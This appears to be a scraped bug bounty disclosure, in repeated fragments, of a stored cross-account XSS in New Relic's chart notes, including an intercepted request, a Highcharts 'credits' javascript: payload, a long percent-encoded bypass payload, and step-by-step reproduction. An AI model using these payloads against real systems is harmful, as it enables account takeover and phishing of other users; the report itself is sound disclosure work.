The impact is higher than usual here because the payload remains after publishing a note so the XSS is **cross-account**. The payload fires at infected note page after victim clicks a link.\n\n###Proof of Concept\nHere I crafted payload that adds new user with role `Admin` to victim's account. So attacker can publish infected note and every admin/owner clicking the link will invite attacker to his own account with admin privileges.\n{F438182}\n\n###Explanation\nThe vulnerability cause is improper user-input filtration at the chart data JSON generation step. When the user saves some chart to note, the following request is made:\n```http\nPOST /accounts/2260599/notes?agent_id=undefined HTTP/1.1\nHost: rpm.newrelic.com\n\nutf8=%E2%9C%93\u0026authenticity_token=47f2Fr393aG89tWfS4byeeEoXdd09p3y8DtKzlZMXJE%3D\u0026app_name=undefined\u0026note_item%5Bswf%5D=\u0026note_item%5Bbegin_time%5D=2019-03-06T04%3A17%3A33-08%3A00\u0026note_item%5Bend_time%5D=2019-03-06T04%3A27%3A45-08%3A00\u0026note_item%5Btitle%5D=TITLE\u0026note_item%5Bdata_url%5D=%2Fchart_data%2Fmetric_charts%2Fsingle_metric.json%3Faccount_id%3D2260599%26add_to_dashboard%3Dfalse%26agent%3D287785625%26chart_type%3DMSLine%26current_product%3Dapm_product%26format_fn%3Dsmart_round%26hide_legend%3Dfalse%26limit%3D100%26name%3DFunction%2526lt%253Bb%2526gt%253Ba%2526lt%253B%252Fb%2526gt%253B%252F__main__%253AMainHandler.get%26no_click%3Dtrue%26no_links%3Dtrue%26number_suffix%3DUNITS%26render_to%3D45055%26show_events%3Dtrue%26subtitle%3DSUBTITLE%26title%3DTITLE%26tw%255Bdur%255D%3D0.17%26tw%255Bend%255D%3D1551875265%26value%3Dstandard_deviation%26no_click%3D1%26no_links%3D1\u0026note_item%5Bcontext_url%5D=%2Faccounts%2F2260599%2Fcustom_dashboards%2Fpages%2F14736%3Ftw%255Bdur%255D%3D0.17%26tw%255Bend%255D%3D1551875265\u0026note_item%5Bnote_text%5D=\u0026note_action=create\u0026note_id=6075\u0026action_after=save_and_close\n```\nParameter `note_item[data_url]` is URL that contains all information about storing chart: account ID, application ID, etc, as well as chart `title`, `subtitle` and `number_suffix`. As I understand, this URL is parsed at the note saving, and all parameters are stored at DB.\nThen, when a note with stored chart is opened, the Highcharts chart URL at this page is set to something like `https://rpm.newrelic.com/accounts/2260599/notes/6077/items/12992/chart_data`. The endpoint above gets the stored `note_item[data_url]` parameters from DB and generates the chart data JSON, that contains everything is needed to draw the chart.\n\nThe vulnerability itself is that at least `title`, `subtitle` and `number_suffix` parameters are HTML-unescaped before they are injected into resulting JSON. So if some of these parameters contains the `\u0026quot;` the resulting JSON becomes broken, for instance:\n{\"title\": \"\u003ctitle\u003e\"}\nbecomes\n{\"title\": \"**title_with_quot\"**\"}.\n\nThat's the way an attacker can inject arbitrary fields at this JSON.\n\nI am not pretty familiar with the Highcharts JS API but I investigated a little and discovered the `credits` field that is a link with text and href, that can be appended to chart. So in my PoC I injected into chart data JSON some content like the following:\n```json\n{\n  \"credits\": {\n    \"enabled\": true,\n    \"text\": \"click here\",\n    \"href\": \"javascript:alert()\",\n    \"style\": {\n      \"fill\": \"red\"\n    },\n    \"position\": {\n      \"verticalAlign\": \"top\"\n    }\n  }\n}\n```\nThe actual payload is a little more complicated, but this is the main concept.\nIn this way, after the fields are retrieved from DB and the JSON is crafted, the resulting JSON contains an order for Highcharts to draw the credits with malicious link.\n\n###Steps to reproduce:\n1. Sign into New Relic app with some account (attacker)\n2. Save any chart to notes and intercept the saving request using some intercepting proxy tool (e.g. Burp Suite)\n3.

As I understand, this URL is parsed at the note saving, and all parameters are stored at DB.\u003cbr\u003e\nThen, when a note with stored chart is opened, the Highcharts chart URL at this page is set to something like \u003ccode\u003ehttps://rpm.newrelic.com/accounts/2260599/notes/6077/items/12992/chart_data\u003c/code\u003e.

So if some of these parameters contains the \u003ccode\u003e\u0026amp;quot;\u003c/code\u003e the resulting JSON becomes broken, for instance:\u003cbr\u003e\n{\u0026quot;title\u0026quot;: \u0026quot;\u0026lt;title\u0026gt;\u0026quot;}\u003cbr\u003e\nbecomes\u003cbr\u003e\n{\u0026quot;title\u0026quot;: \u0026quot;\u003cstrong\u003etitle_with_quot\u0026quot;\u003c/strong\u003e\u0026quot;}.\u003c/p\u003e\n\n\u003cp\u003eThat\u0026#39;s the way an attacker can inject arbitrary fields at this JSON.\u003c/p\u003e\n\n\u003cp\u003eI am not pretty familiar with the Highcharts JS API but I investigated a little and discovered the \u003ccode\u003ecredits\u003c/code\u003e field that is a link with text and href, that can be appended to chart.

Now I understand the steps preformed when the chart is saved to note better:\n1. The `note_item[data_url]` URL parameter is saved to DB **as is**, not its parameters only;\n2. When the note is opened, and chart data is loaded from URL like `accounts/2260599/notes/6077/items/12992/chart_data`, server **makes real GET-query with user's cookies** to the saved URL (this is the step where I found an **extra bug** – attacker can submit any *internal* URL here and its content will be followed to the chart);\n3. Then the server processes retrieved data (this is the step where all issues described above like replacing `\u0026quot;` to `\"` and HTML tags processing are done) and returns the processed data to client.\n\n###So, there 2 vulnerabilities in fact:\n1. The one described at my first submission. Improper processing the `note_item[data_url]` response: `\u0026quot;` unescaping and HTML tags processing, that helps attacker to break resulting JSON and inject malicious payload inside.\n2. Improper `note_item[data_url]` check itself: attacker can submit any internal URL there and its content will be returned to the Highcharts chart. So if you fix the first vulnerability, attacker can submit any other internal URL returning JSON with malicious payload when saving a chart to note and it could be resulted in XSS too.\n\nI was not successful with submitting any *external* URL but there are many JSON endpoints at New Relic app and I am pretty sure that some of them could also be used to exploit this vulnerability. In any case, you should check the `note_item[data_url]` URL better (that it is a chart data JSON URL, not something else), because every internal URL (even returning HTML) is allowed now.\n\n###Extra mitigation #2\n\nIn my opinion the design of vulnerable component is bad at all. Storing the URL as is and requesting it when build a chart data JSON is justified only if different complicated endpoints can provide the chart data. For now, I see only `/chart_data/metric_charts/single_metric.json` endpoint providing initial chart data, so you can parse a submitted URL and get necessary parameters from it, and then get data from DB searching for the corresponding entries. If I am wrong and there are many different endpoints, you should build a URL white list, containing only trusted endpoints, that may not contain malicious JSON.\n\nIf I am not clear somewhere, please feel free to reach me and I will be glad to help in discovering and mitigating the issues.\n\n**P.S.**: I have decided not to submit the second bug apart, but if you agree that there 2 different root causes exist, the extra bounty bonus will be much appreciated :)","markdown_message":"\u003cp\u003eHey team,\u003c/p\u003e\n\n\u003cp\u003eAfter further investigations I have discovered that the vulnerability root cause is slightly more complicated.\u003cbr\u003e\nI was wrong a little describing how the process works.

The core vulnerability cause is that `\u0026quot;` escape sentence is HTML-decoded and breaks the resulting JSON becoming the `\"` inside server response, which gives an attacker the opportunity to inject arbitrary chart attributes. Instead of fixing the core cause, the devs have added the replace rule changing the `javascript:` to `javascript ` (with the space sign at the end). That's why you observed the behavior above: the link `javascript alert()` considers as internal link by browser so it tries to load `https://rpm.newrelic.com/accounts/{account_id}/notes/javascript%20alert()`.\n\nBut attacker still can, for instance, use a regular links to perform a phishing attack against the victim. This is how you can reproduce this case:\n1) Sign into New Relic app with some account (attacker)\n2) Save any chart to notes and intercept the saving request using some intercepting proxy tool (e.g. Burp Suite)\n3) Find parameter `note_item%5Bdata_url%5D`, then find any `%26` inside it and replace it with\n```\n%26%73%75%62%74%69%74%6c%65%3d%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%37%32%25%36%35%25%36%34%25%36%39%25%37%34%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%35%25%36%65%25%36%31%25%36%32%25%36%63%25%36%35%25%36%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%34%25%37%32%25%37%35%25%36%35%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%38%25%37%32%25%36%35%25%36%36%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%36%37%25%36%66%25%36%66%25%36%37%25%36%63%25%36%35%25%32%65%25%36%33%25%36%66%25%36%64%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%34%25%36%35%25%37%38%25%37%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%33%25%36%66%25%36%64%25%36%35%25%37%34%25%36%38%25%36%39%25%36%65%25%36%37%25%32%30%25%36%39%25%37%33%25%32%30%25%37%37%25%37%32%25%36%66%25%36%65%25%36%37%25%32%30%25%36%31%25%37%34%25%32%30%25%36%66%25%37%35%25%37%32%25%32%30%25%36%35%25%36%65%25%36%34%25%32%65%25%32%30%25%35%30%25%36%63%25%36%35%25%36%31%25%37%33%25%36%35%25%32%30%25%36%33%25%36%63%25%36%39%25%36%33%25%36%62%25%32%30%25%36%38%25%36%35%25%37%32%25%36%35%25%32%30%25%37%34%25%36%66%25%32%30%25%37%32%25%36%35%25%37%34%25%37%32%25%37%39%25%32%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%33%25%37%34%25%37%39%25%36%63%25%36%35%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%36%66%25%36%63%25%36%66%25%37%32%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%32%25%36%35%25%36%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%36%25%36%66%25%36%65%25%37%34%25%35%33%25%36%39%25%37%61%25%36%35%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%32%25%33%30%25%37%30%25%37%38%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%30%25%36%66%25%37%33%25%36%39%25%37%34%25%36%39%25%36%66%25%36%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%31%25%36%63%25%36%39%25%36%37%25%36%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%36%35%25%36%65%25%37%34%25%36%35%25%37%32%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%36%25%36%35%25%37%32%25%37%34%25%36%39%25%36%33%25%36%31%25%36%63%25%34%31%25%36%63%25%36%39%25%36%37%25%36%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%34%25%36%66%25%37%30%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%39%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%33%33%25%33%30%25%37%64%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%66%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%66%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%26\n```\n4) Send edited request.\n5) Open the newest note and make sure it contains a red credits link at the top of chart.\n6) Press the link and make sure you are redirected to `google.com`\n\nAttacker can also use `data:` URIes and any other schemes, because the `javascipt:` is only thing to be replaced. And he maybe still can perform an XSS, because the arbitrary chart parameters still could be injected into the server response (but it can take a long to find another place to inject a payload (w/o using the javascript: link), so I think you agree that an active link is sufficient proof of the fact that the issue are not fixed correctly).\n\nIf I should find a bypass exactly leading to XSS, to issue be reopened, I can report this one as HTML-injection separately, and try to find a full bypass. But please believe, the fix is wrong.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/jmcaleer\"\u003e@jmcaleer\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe issue isn\u0026#39;t resolved properly.
